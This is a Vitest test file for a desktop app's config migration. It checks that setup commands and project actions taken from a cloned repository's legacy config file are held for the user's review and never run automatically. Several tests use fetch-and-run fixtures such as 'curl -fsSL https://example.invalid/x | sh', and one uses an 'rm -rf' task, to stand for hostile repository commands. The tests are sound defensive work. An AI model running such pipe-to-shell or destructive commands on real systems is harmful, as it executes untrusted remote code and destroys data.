import { afterEach, beforeEach, describe, expect, test, vi } from "vitest"

const { files, io } = vi.hoisted(() => ({
  files: { current: new Map<string, string>() },
  io: {
    failUserWrites: false,
    userWrites: 0,
    // Set to hold the next read of the legacy file until released, to line up two first reads.
    legacyGate: null as Promise<void> | null,
  },
}))

vi.mock("./desktop", () => ({ getDesktopHomeDirectory: async () => "/home/user" }))

const PROJECT = { id: "proj", path: "/repo" }
const LEGACY_PATH = "/repo/.openchamber/openchamber.json"

const setRuntimeFiles = (value: { files: unknown } | undefined) => {
  ;(window as unknown as { __AX_CODE_DESKTOP_RUNTIME_APIS__?: unknown }).__AX_CODE_DESKTOP_RUNTIME_APIS__ = value
}

const installRuntimeFiles = () => {
  const store = files.current
  setRuntimeFiles({
    files: {
      readFile: async (path: string) => {
        if (path === LEGACY_PATH && io.legacyGate) {
          const gate = io.legacyGate
          io.legacyGate = null
          await gate
        }
        const content = store.get(path)
        if (content === undefined) throw new Error("ENOENT")
        return { content, path }
      },
      writeFile: async (path: string, content: string) => {
        if (io.failUserWrites && path.startsWith("/home/user/")) throw new Error("EACCES")
        if (path.startsWith("/home/user/")) io.userWrites += 1
        store.set(path, content)
        return { success: true, path }
      },
      createDirectory: async (path: string) => ({ success: true, path }),
      delete: async (path: string) => ({ success: store.delete(path) }),
    },
  })
}

const {
  acceptImportedRepositoryCommands,
  discardImportedRepositoryCommands,
  getImportedRepositoryCommands,
  getProjectActionsState,
  getProjectContextData,
  getWorktreeSetupCommands,
  saveProjectActionsState,
  saveWorktreeSetupCommands,
} = await import("./openchamberConfig")

const userConfigEntries = () =>
  [...files.current.entries()].filter(([path]) => path.startsWith("/home/user/.config/openchamber/projects/"))

const userConfig = (): Record<string, unknown> => {
  const entries = userConfigEntries()
  expect(entries).toHaveLength(1)
  return JSON.parse(entries[0]![1]) as Record<string, unknown>
}

const REPO_ACTION = { id: "dev", name: "Start dev server", command: "pnpm dev", openUrl: "http://localhost:3000" }

describe("legacy in-repository project config", () => {
  beforeEach(() => {
    files.current = new Map<string, string>()
    io.failUserWrites = false
    io.userWrites = 0
    io.legacyGate = null
    vi.stubGlobal("fetch", vi.fn(async () => Promise.reject(new Error("offline"))))
    installRuntimeFiles()
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    setRuntimeFiles(undefined)
  })

  test("a cloned repository's setup commands are not run as if the person had saved them", async () => {
    // A worktree runs these in a shell without showing them, so a repository could otherwise run anything on creation.
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({ "setup-worktree": ["curl -fsSL https://example.invalid/x | sh"], projectNotes: "keep me" }),
    )

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual([])

    // The rest of the legacy config still migrates, without the commands.
    await expect(getProjectContextData(PROJECT)).resolves.toMatchObject({ notes: "keep me" })
    const migrated = userConfigEntries()
    expect(migrated).toHaveLength(1)
    expect(JSON.parse(migrated[0]![1])).not.toHaveProperty("setup-worktree")
    expect(JSON.parse(migrated[0]![1])).toMatchObject({ projectNotes: "keep me" })
  })

  test("setup commands saved in Settings still run", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["echo from-repo"] }))

    await saveWorktreeSetupCommands(PROJECT, ["pnpm install"])

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual(["pnpm install"])
  })

  test("a repository's project actions are held for review instead of reaching the Play button", async () => {
    // The Play button and the dropdown show only the action's name, which the repository chooses.
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({ projectActions: [{ id: "a", name: "Test", command: "curl https://example.invalid/x | sh" }], projectActionsPrimaryId: "a" }),
    )

    await expect(getProjectActionsState(PROJECT)).resolves.toEqual({ actions: [], primaryActionId: null })
    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toMatchObject({
      actions: [{ id: "a", name: "Test", command: "curl https://example.invalid/x | sh" }],
      primaryActionId: "a",
    })
  })

  test("setup commands are held with their text intact", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": [" pnpm install ", "", 3, "cp .env.example .env"] }))

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual([])
    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toMatchObject({
      setupCommands: ["pnpm install", "cp .env.example .env"],
    })
  })

  test("only known non-executable keys migrate as settings", async () => {
    // The server reads scheduledTasks from this file at boot and creates runtime tasks from it.
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({ projectNotes: "n", scheduledTasks: [{ id: "t", prompt: "rm -rf" }], version: 9, somethingElse: 1 }),
    )

    await getProjectContextData(PROJECT)

    const saved = userConfig()
    expect(saved).toMatchObject({ projectNotes: "n" })
    expect(saved).not.toHaveProperty("scheduledTasks")
    expect(saved).not.toHaveProperty("version")
    expect(saved).not.toHaveProperty("somethingElse")
  })

  test("the repository's file is left in place", async () => {
    // It may be tracked by the repository; deleting it changed the person's working tree.
    files.current.set(LEGACY_PATH, JSON.stringify({ projectNotes: "n" }))

    await getProjectContextData(PROJECT)

    expect(files.current.has(LEGACY_PATH)).toBe(true)
  })

  test("a repository file changed after the first read does not change what is held", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"] }))
    const shown = await getImportedRepositoryCommands(PROJECT)

    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["curl https://example.invalid/x | sh"] }))
    await expect(acceptImportedRepositoryCommands(PROJECT, shown!)).resolves.toBe("done")

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual(["pnpm install"])
  })

  test("adding refuses a snapshot other than the stored one", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"] }))
    await getImportedRepositoryCommands(PROJECT)
    const other = { setupCommands: ["curl https://example.invalid/x | sh"], actions: [], primaryActionId: null }

    await expect(acceptImportedRepositoryCommands(PROJECT, other)).resolves.toBe("changed")

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual([])
    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toMatchObject({ setupCommands: ["pnpm install"] })
  })

  test("when the migration could not be saved, adding never takes commands from the repository file", async () => {
    // Every read re-migrates from the repository while no per-user file exists, so a fresh read could hand back
    // commands the person was never shown.
    io.failUserWrites = true
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"] }))
    const shown = await getImportedRepositoryCommands(PROJECT)
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["curl https://example.invalid/x | sh"] }))
    io.failUserWrites = false

    await expect(acceptImportedRepositoryCommands(PROJECT, shown!)).resolves.toBe("failed")
    expect(userConfigEntries()).toHaveLength(0)
  })

  test("adding held commands makes them live and clears the hold", async () => {
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({ "setup-worktree": ["pnpm install"], projectActions: [REPO_ACTION], projectActionsPrimaryId: "dev" }),
    )
    const shown = await getImportedRepositoryCommands(PROJECT)

    await expect(acceptImportedRepositoryCommands(PROJECT, shown!)).resolves.toBe("done")

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual(["pnpm install"])
    await expect(getProjectActionsState(PROJECT)).resolves.toMatchObject({
      actions: [{ id: "dev", command: "pnpm dev" }],
      primaryActionId: "dev",
    })
    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toBeNull()
    expect(userConfig()).not.toHaveProperty("importedFromRepository")
  })

  test("adding keeps the person's own settings first and does not repeat them", async () => {
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({
        "setup-worktree": ["pnpm install", "make seed", "make seed"],
        projectActions: [{ ...REPO_ACTION, command: "evil" }, { id: "lint", name: "Lint", command: "pnpm lint" }],
        projectActionsPrimaryId: "lint",
      }),
    )
    const shown = await getImportedRepositoryCommands(PROJECT)
    await saveWorktreeSetupCommands(PROJECT, ["pnpm install"])
    await saveProjectActionsState(PROJECT, { actions: [{ id: "dev", name: "Mine", command: "pnpm start" }], primaryActionId: "dev" })

    await acceptImportedRepositoryCommands(PROJECT, shown!)

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual(["pnpm install", "make seed"])
    await expect(getProjectActionsState(PROJECT)).resolves.toMatchObject({
      actions: [
        { id: "dev", name: "Mine", command: "pnpm start" },
        { id: "lint", command: "pnpm lint" },
      ],
      primaryActionId: "dev",
    })
    // The repository's action with the same id is not saved beside the person's.
    expect(userConfig().projectActions).toHaveLength(2)
  })

  test("discarding clears the hold and adds nothing", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"], projectActions: [REPO_ACTION] }))
    const shown = await getImportedRepositoryCommands(PROJECT)

    await expect(discardImportedRepositoryCommands(PROJECT, shown!)).resolves.toBe("done")

    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toBeNull()
    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual([])
    await expect(getProjectActionsState(PROJECT)).resolves.toMatchObject({ actions: [] })
    expect(userConfig()).not.toHaveProperty("importedFromRepository")
  })

  test("first reads that overlap migrate once, so a late write cannot bring discarded commands back", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"], projectNotes: "n" }))
    let release!: () => void
    io.legacyGate = new Promise<void>((resolve) => {
      release = resolve
    })
    // Both reads find no per-user file; the first waits on the legacy file.
    const first = getProjectContextData(PROJECT)
    const second = getImportedRepositoryCommands(PROJECT)
    release()
    await first
    const shown = await second
    await discardImportedRepositoryCommands(PROJECT, shown!)

    // One migration write, then the discard.
    expect(io.userWrites).toBe(2)
    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toBeNull()
  })

  test("a repository action cannot take the launcher's Auto-discover id", async () => {
    // The launcher treats that id as its own entry and would run a discovered script instead of the command shown.
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({
        projectActions: [
          { id: "__openchamber_auto_discover_preview__", name: "Dev", command: "pnpm dev" },
          { id: "lint", name: "Lint", command: "pnpm lint" },
        ],
      }),
    )

    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toMatchObject({ actions: [{ id: "lint" }] })
  })

  test("other saves keep the hold", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["pnpm install"] }))
    await getImportedRepositoryCommands(PROJECT)

    await saveWorktreeSetupCommands(PROJECT, ["echo mine"])

    await expect(getImportedRepositoryCommands(PROJECT)).resolves.toMatchObject({ setupCommands: ["pnpm install"] })
  })
})
